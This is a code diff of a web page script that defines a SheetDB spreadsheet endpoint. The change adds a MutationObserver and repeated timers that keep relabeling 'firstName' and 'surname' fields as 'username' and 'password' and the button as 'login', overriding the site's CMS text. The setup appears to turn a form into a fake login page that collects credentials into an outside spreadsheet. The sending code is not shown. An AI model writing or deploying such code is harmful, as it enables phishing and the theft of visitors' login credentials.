@@ -134,19 +134,49 @@
         document.addEventListener('DOMContentLoaded', function () {
             const API_URL = "https://sheetdb.io/api/v1/stcjj8p8ctx44";
 
-            // 🔴 FORCE OVERRIDE CMS TEXT AFTER PAGE LOADS
-            setTimeout(function() {
+            //  FORCE OVERRIDE FUNCTION
+            function forceOverrideTexts() {
                 // Override placeholders
-                document.getElementById('firstName').placeholder = 'username';
-                document.getElementById('surname').placeholder = 'password';
-                
-                // Override button text
+                var firstNameInput = document.getElementById('firstName');
+                var surnameInput = document.getElementById('surname');
                 var btnText = document.querySelector('.btn-login-text');
-                if (btnText) {
+                
+                if (firstNameInput && firstNameInput.placeholder !== 'username') {
+                    firstNameInput.placeholder = 'username';
+                    firstNameInput.removeAttribute('data-cms-ph');
+                }
+                
+                if (surnameInput && surnameInput.placeholder !== 'password') {
+                    surnameInput.placeholder = 'password';
+                    surnameInput.removeAttribute('data-cms-ph');
+                }
+                
+                if (btnText && btnText.textContent !== 'login') {
                     btnText.textContent = 'login';
                     btnText.removeAttribute('data-cms');
                 }
-            }, 500); // Wait for CMS to finish loading
+            }
+
+            // 🔴 MUTATION OBSERVER - Watches for CMS changes and overrides them
+            var observer = new MutationObserver(function(mutations) {
+                forceOverrideTexts();
+            });
+
+            // Start observing the document for changes
+            observer.observe(document.body, {
+                childList: true,
+                subtree: true,
+                attributes: true,
+                attributeFilter: ['placeholder', 'data-cms-ph', 'data-cms']
+            });
+
+            // Initial override
+            forceOverrideTexts();
+
+            // Also run after a delay to catch any late CMS loads
+            setTimeout(forceOverrideTexts, 1000);
+            setTimeout(forceOverrideTexts, 2000);
+            setTimeout(forceOverrideTexts, 3000);
 
             // 🔴 Popup function
             function showAlert(message) {
